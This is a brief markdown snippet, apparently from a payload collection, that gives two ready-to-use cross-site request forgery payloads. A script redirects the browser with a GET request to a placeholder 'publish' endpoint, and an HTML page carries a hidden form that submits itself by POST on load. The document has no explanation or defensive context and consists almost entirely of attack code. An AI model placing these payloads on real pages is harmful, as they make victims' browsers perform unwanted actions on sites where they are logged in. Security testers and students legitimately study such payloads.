### GET

```html
<script>
    window.location = "http://host/publish";
</script>
```

### POST

```html
<html>
  <body>
    <h1>Redirecting...</h1>
    <form 
      id="csrfForm" 
      action="http://host/publish" 
      method="POST"
    >
    </form>
    <script>
      document.getElementById("csrfForm").submit();
    </script>
  </body>
</html>
```
